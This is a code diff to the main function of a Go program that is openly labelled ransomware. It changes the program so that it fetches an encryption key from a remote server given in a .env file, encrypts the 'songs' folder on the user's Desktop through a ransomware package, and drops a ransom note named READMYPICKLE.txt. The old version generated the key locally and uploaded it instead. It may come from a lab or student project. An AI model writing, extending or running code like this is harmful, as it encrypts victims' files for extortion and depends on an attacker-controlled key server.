@@ -8,12 +8,10 @@
 package main
 
 import (
-	"crypto/rand"
-	"encoding/json"
 	"fmt"
+	"io"
 	"log"
 	"net/http"
-	"net/url"
 	"os"
 	"path/filepath"
 	"runtime"
@@ -43,41 +41,42 @@ func main() {
 		return
 	}
 
-	err := godotenv.Load()
-	if err != nil {
-		log.Fatal("Error loading .env file")
-	}
-
-	key := make([]byte, 32)
-	_, err = rand.Read(key)
-	if err != nil {
-		fmt.Println("Error generating AES key:", err)
+	// check if ransomware was already executed
+	_, err := os.Stat(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//READMYPICKLE.txt"))
+	if err == nil {
+		fmt.Println("Ransomware has already been executed. Exiting...")
 		return
 	}
 
-	values := url.Values{
-		"key": {string(key)},
+	err = godotenv.Load()
+	if err != nil {
+		log.Fatal("Error loading .env file")
 	}
 
 	ipaddr := os.Getenv("IP_ADDRESS")
 	port := os.Getenv("PORT")
 
-	resp, err := http.PostForm("http://"+ipaddr+":"+port+"/upload", values)
+	fmt.Println("Connecting to server...")
 
+	resp, err := http.Get("http://" + ipaddr + ":" + port + "/createkey")
 	if err != nil {
-		fmt.Println("Error sending key to server: " + ipaddr + ":" + port + "\n")
+		fmt.Println("Error getting key:", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	fmt.Println("Getting key from server...")
+
+	key, err := io.ReadAll(resp.Body)
+	if err != nil {
+		fmt.Println("Error reading key:", err)
 		return
 	}
 
-	defer resp.Body.Close()
-
-	var res map[string]interface{}
-
-	json.NewDecoder(resp.Body).Decode(&res)
-
-	fmt.Println(res["form"])
+	fmt.Println("Key:", string(key))
 
 	ransomware.ExecuteRansom(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//songs"), key)
+	key = nil
 
-	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//README.txt"), []byte(Statement), 0644)
+	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//READMYPICKLE.txt"), []byte(Statement), 0644)
 }
